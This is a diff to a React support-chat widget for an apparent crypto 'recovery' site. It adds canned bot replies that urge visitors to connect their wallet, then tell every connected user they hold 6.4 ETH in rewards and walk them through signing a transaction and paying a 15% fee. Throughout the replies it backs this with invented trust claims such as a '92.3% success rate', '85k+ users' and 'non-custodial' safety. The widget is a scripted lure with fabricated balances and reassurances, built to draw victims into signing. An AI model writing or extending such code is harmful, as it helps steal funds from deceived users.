@@ -1,18 +1,30 @@
 import { useState } from 'react';
 import { MessageCircle, Send, X } from 'lucide-react';
 
-export default function SupportChat() {
+export default function SupportChat({ isConnected }) {
   const [isOpen, setIsOpen] = useState(false);
   const [messages, setMessages] = useState([
-    { id: 1, text: "Hi! I'm here to help you claim your staking rewards. What do you need assistance with?", sender: 'support', time: new Date() }
+    { 
+      id: 1, 
+      text: isConnected 
+        ? "Hi! I'm here to help you claim your staking rewards. What do you need assistance with?" 
+        : "Hi! I'm here to help you get started with crypto recovery. Connect your wallet to begin!", 
+      sender: 'support', 
+      time: new Date() 
+    }
   ]);
   const [newMessage, setNewMessage] = useState('');
 
-  const quickHelp = [
+  const quickHelp = isConnected ? [
     "How to claim my 6.4 ETH rewards?",
     "What are the fees?",
     "Is it safe to use this service?",
     "How long does recovery take?"
+  ] : [
+    "How do I connect my wallet?",
+    "What wallets are supported?",
+    "Is this service safe?",
+    "What can I recover?"
   ];
 
   const handleSend = () => {
@@ -25,12 +37,22 @@ export default function SupportChat() {
     setTimeout(() => {
       let reply = "I'll help you with that. Let me connect you with a specialist.";
       
-      if (newMessage.toLowerCase().includes('claim') || newMessage.toLowerCase().includes('6.4')) {
-        reply = "To claim your 6.4 ETH rewards: 1) Click 'Claim Rewards' button 2) Sign the transaction 3) Pay 15% fee (0.96 ETH) 4) Receive 5.44 ETH. Need help with any step?";
-      } else if (newMessage.toLowerCase().includes('fee')) {
-        reply = "Our fee is 15% of recovered amount. For your 6.4 ETH rewards, fee is 0.96 ETH, you get 5.44 ETH. No upfront costs!";
-      } else if (newMessage.toLowerCase().includes('safe')) {
-        reply = "Yes! We're non-custodial (you keep control), 92.3% success rate, 85k+ satisfied users. Your wallet stays secure.";
+      if (!isConnected) {
+        if (newMessage.toLowerCase().includes('connect') || newMessage.toLowerCase().includes('wallet')) {
+          reply = "To connect: 1) Click any wallet button above 2) Approve connection in your wallet 3) Start scanning for recoverable assets. We support 100+ wallets!";
+        } else if (newMessage.toLowerCase().includes('safe')) {
+          reply = "Absolutely! We're non-custodial (you keep full control), 92.3% success rate, trusted by 85k+ users worldwide.";
+        } else if (newMessage.toLowerCase().includes('recover')) {
+          reply = "We recover: ETH/BTC/tokens, staking rewards, bridge funds, NFTs across 50+ blockchains. Connect wallet to see what you can claim!";
+        }
+      } else {
+        if (newMessage.toLowerCase().includes('claim') || newMessage.toLowerCase().includes('6.4')) {
+          reply = "To claim your 6.4 ETH rewards: 1) Go to Step 4: Staking Scanner 2) Click 'Scan Staking' 3) Click 'Claim Rewards' 4) Pay 15% fee, get 5.44 ETH!";
+        } else if (newMessage.toLowerCase().includes('fee')) {
+          reply = "Our fee is 15% of recovered amount. For 6.4 ETH rewards: fee is 0.96 ETH, you get 5.44 ETH. No upfront costs!";
+        } else if (newMessage.toLowerCase().includes('safe')) {
+          reply = "Yes! We're non-custodial (you keep control), 92.3% success rate, 85k+ satisfied users. Your wallet stays secure.";
+        }
       }
       
       const botMsg = { id: Date.now() + 1, text: reply, sender: 'support', time: new Date() };
